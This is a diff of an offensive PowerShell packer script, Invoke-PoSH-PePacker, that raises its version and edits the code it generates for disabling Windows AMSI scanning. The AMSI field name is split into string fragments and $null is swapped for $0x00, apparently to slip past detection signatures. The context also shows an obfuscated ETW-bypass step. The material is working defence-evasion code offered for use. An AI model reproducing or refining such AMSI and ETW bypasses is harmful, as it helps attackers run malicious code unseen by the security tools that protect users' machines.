@@ -21,7 +21,7 @@ Write-Output "
  | _ \ __|__| _ \__  __| |_____ _ _ 
  |  _/ _|___|  _/ _|/ _| / / -_)  _|
  |_| |___|  |_| \__,\__|_\_\___|_|  
-                                   v1.2
+                                   v1.3
 
 Usage: 
 > Import-Module ./Invoke-PoSH-PePacker.ps1
@@ -155,7 +155,7 @@ function Invoke-PoSH-PePacker {
         $AssemblyLoaderFileFile += $code_fixed_order5 -join ''
 	$code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order6 -join ''
-        $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
+        $code_fixed_order7 += '${23}.SetValue($0x00,$true)' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order7 -join ''
  
         Write-Output "[*] Adding 'E'T'W' bypass" 
